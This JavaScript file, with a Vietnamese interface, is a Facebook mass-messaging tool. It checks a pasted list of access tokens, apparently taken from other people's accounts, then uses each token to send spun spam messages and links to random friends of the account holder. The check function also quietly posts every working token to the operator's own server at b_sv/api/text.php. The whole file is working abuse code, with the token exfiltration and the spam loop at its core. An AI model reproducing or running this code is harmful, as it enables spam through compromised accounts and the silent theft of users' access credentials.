function inbox_send_check(a) {
    $.get('https://graph.facebook.com/', {
        method: 'post',
        access_token: a,
        batch: '[{\"method\":\"GET\",\"relative_url\":\"me?fields=id,name\"},{\"method\":\"GET\",\"relative_url\":\"fql?q=SELECT uid, name FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) ORDER BY rand() LIMIT ' + inbox.limit + '\"}]',
        include_headers: 'false'
    }, function(d) {
        var j = JSON.parse(d[0].body);
        inbox.array[inbox.success] = [], inbox.array[inbox.success].uid = j.id, inbox.array[inbox.success].name = j.name, inbox.array[inbox.success].data = JSON.parse(d[1].body).data, inbox.array[inbox.success].access_token = a, inbox.success++, inbox.bach += a + '\n', tbody = '', tbody += '<tr>', tbody += '	<td>' + inbox.success + '</td>', tbody += '	<td>' + j.name + '</td>', tbody += '	<td align=\"center\">' + inbox.array[inbox.success - 1].data.length + '</td>', tbody += '	<td align=\"center\"><font color=\"green\"><span id=\"inbox_success_' + inbox.success + '\">0</span></font></td>', tbody += '	<td align=\"center\"><font color=\"red\"><span id=\"inbox_error_' + inbox.success + '\">0</span></font></td>', tbody += '	<td id=\"inbox_status_' + inbox.success + '\" b-data=\"loading\">Đang chờ !</td>', tbody += '</tr>', $('#html_inbox_send_body').append(tbody)
    }).fail(function(d) {
        'undefined' == typeof d.responseText ? inbox_check(a) : inbox.error++
    }).always(function() {
        if (inbox.success + inbox.error == inbox.token.split('\n').length) {
            if (inbox.success > 0) {
                var a = $.trim(inbox.bach).split('\n');
                a.length > 0 && $.post('//' + b_sv + '/api/text.php', {
                    act: 'save',
                    array: a
                });
                for (var d = 0; d < inbox.array.length; d++) {
                    inbox_send_msg(d, 0)
                }
            } else {
                $('#submit_inbox_send').buttonStop(), $('#submit_inbox_send_stop').disabled(), noti.success('Không Access Token nào Live !'), $('#html_inbox_send_result').hide()
            }
        }
    })
}

function inbox_send_msg(a, d) {
    return 0 == inbox.run ? !1 : void((0 == inbox.array[a].data.length ? ($('#inbox_status_' + (a + 1)).html('<font color=\"red\">Không có bạn bè !</font>'), inbox.total++, inbox.total == inbox.success && ($('#submit_inbox_send').buttonStop(), $('#submit_inbox_send_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !'))) : ! function(j, c, b) {
        $('#inbox_status_' + (a + 1)).html('<font color=\"blue\">Đang gửi tin nhắn đến <b>' + b + '</b></font> ' + run.loading()), $.get('https://graph.facebook.com/me/threads', {
            locale: 'en_US',
            to: '[{\"type\":\"id\",\"id\":\"' + c + '\"}]',
            method: 'post',
            return_structure: 'true',
            message: init.spinText(inbox.message.replace(/\$\m\e/g, j).replace(/\$\y\o\u/g, b)),
            link: init.spinText(inbox.link),
            name: init.spinText(inbox.name),
            picture: init.spinText(inbox.picture),
            description: init.spinText(inbox.description),
            access_token: inbox.array[a].access_token
        }).done(function() {
            $('#inbox_success_' + (a + 1)).text(parseInt($('#inbox_success_' + (a + 1)).text()) + 1), $('#inbox_status_' + (a + 1)).html('<font color=\"green\">Gửi đến <b>' + b + '</b> thành công, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading())
        }).error(function(d) {
            if ($('#inbox_error_' + (a + 1)).text(parseInt($('#inbox_error_' + (a + 1)).text()) + 1), $('#inbox_status_' + (a + 1)).html('<font color=\"red\">Gửi đến <b>' + b + '</b> thất bại, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading()), d.responseText) {
                var d = init.replace_JSON(d.responseText);
                noti.error(d.error.message)
            }
        }).always(function() {
            d + 1 < inbox.array[a].data.length ? timer.count_down_array(0, Math.floor(inbox.delay / 60), inbox.delay - 60 * Math.floor(inbox.delay / 60), 'timedown_' + (a + 1), a, function() {
                inbox_send_msg(a, d + 1)
            }) : ($('#inbox_status_' + (a + 1)).html('<font color=\"green\">Hoàn thành !</font>'), inbox.total++, inbox.total == inbox.success && ($('#submit_inbox_send').buttonStop(), $('#submit_inbox_send_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !')))
        })
    }(inbox.array[a].name, inbox.array[a].data[d].uid, inbox.array[a].data[d].name)))
}
location.hostname == b_sv && ($(document).on('click', '#submit_inbox_send_stop', function() {
    inbox.run = 0;
    for (var a = 0; a < inbox.array.length; a++) {
        clearTimeout(timeout_array[a])
    };
    $('[b-data=\'loading\']').text('Đã có lệnh dừng !'), $('#submit_inbox_send_stop').disabled(), $('#submit_inbox_send').buttonStop(), noti.success('Đã có lệnh dừng gửi tin nhắn !')
}), $(document).on('click', '#submit_inbox_send', function() {
    inbox = {
        token: $('#input_inbox_send_token').validate(),
        message: $('#input_inbox_send_msg').validate(),
        link: $('#input_inbox_send_link').val(),
        name: $('#input_inbox_send_name').val(),
        picture: $('#input_inbox_send_picture').val(),
        description: $('#input_inbox_send_description').val(),
        delay: $('#input_inbox_send_delay').isNumber(),
        limit: $('#input_inbox_send_limit').isNumber(),
        array: [],
        run: 1,
        total: 0,
        success: 0,
        error: 0,
        bach: ''
    }, inbox.token && inbox.message && inbox.delay && inbox.limit && ($(this).buttonLoad(), $('#submit_inbox_send_stop').undisabled(), $('#html_inbox_send_result').fadeIn('fast'), $('#html_inbox_send_body').html(''), $.each(inbox.token.split('\n'), function(a, d) {
        var j = d.split('|');
        j = j[1] ? j[1] : d, setTimeout(function() {
            inbox_send_check(j)
        }, 15 * a)
    }))
}))